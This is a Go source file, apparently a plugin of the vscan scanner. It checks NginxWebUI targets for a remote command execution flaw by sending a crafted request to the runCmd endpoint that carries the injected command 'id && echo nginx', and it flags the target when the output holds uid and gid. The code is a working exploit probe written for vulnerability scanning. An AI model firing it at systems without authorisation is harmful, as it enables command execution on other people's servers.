package nginx

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func NginxWebUI_runCmd_rce(u string) bool {

	if resp, err := pkg.HttpRequset(u+"/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx", "GET", "", false, nil); err == nil {
		if strings.Contains(resp.Body, "uid") && strings.Contains(resp.Body, "gid") && strings.Contains(resp.Body, "groups") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln NginxWebUI_runCmd_rce|%s|参考链接：https://mp.weixin.qq.com/s/5N89pINE9SmpMFUoVJlgbA\n", u))
			return true
		}
	}

	return false
}
